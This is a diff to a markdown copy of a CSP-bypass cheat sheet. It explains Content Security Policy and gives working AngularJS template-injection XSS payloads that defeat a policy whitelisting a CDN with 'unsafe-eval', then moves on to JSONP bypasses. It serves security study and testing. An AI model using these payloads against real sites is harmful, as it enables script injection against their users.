@@ -1,3 +1,9 @@
+##
+#
+https://hacksheets.in/all-categories/web-application-main/content-security-policy-csp-bypass/
+#
+##
+
 Content Security Policy CSP Bypass
 What is CSP
 Content Security Policy or CSP is a built-in browser technology which helps protect from attacks such as cross-site scripting (XSS). It lists and describes paths and sources, from which the browser can safely load resources. The resources may include images, frames, javascript and more. Here is an example of allowing resource from the local domain (self) to be loaded and executed in-line and allow string code executing functions like eval, setTimeout or setInterval:
@@ -107,8 +113,9 @@ Third Party Endpoints + ‘unsafe-eval’
 Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval'; 
 Load a vulnerable version of angular and execute arbitrary JS:
 
-1
-2
+
+
+```
 <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
 <div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>
 Other payloads:
@@ -125,6 +132,8 @@ Other payloads:
  
 "><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
 <div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
+```
+  
 Third Party Endpoints + JSONP
 Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none';
 Scenarios like this where script-src is set to self and a particular domain which is whitelisted can be bypassed using JSONP. JSONP endpoints allow insecure callback methods which allow an attacker to perform XSS, working payload:
